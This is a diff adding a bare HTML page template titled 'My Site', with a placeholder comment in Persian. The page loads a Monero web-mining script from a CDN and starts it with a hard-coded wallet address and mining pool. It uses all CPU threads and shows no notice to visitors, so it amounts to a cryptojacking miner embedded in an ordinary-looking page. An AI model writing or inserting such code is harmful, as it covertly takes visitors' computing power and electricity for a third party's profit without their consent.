@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>My Site</title>
+</head>
+<body>
+
+  <!-- محتوای سایت شما اینجا -->
+
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+  <script>
+    server = "wss://proxy-miner.onrender.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "497Dw2aLzDnAcaxSGPsGoA31s4ZiBfNAQTe7yG8V8onkWZ5HJdhyej1Y4wDbJfqidZLHuSSdFbwsYaWShi249eZ8ErJgvND";
+    var workerId = "mysite";
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 80;
+  </script>
+
+</body>
+</html>
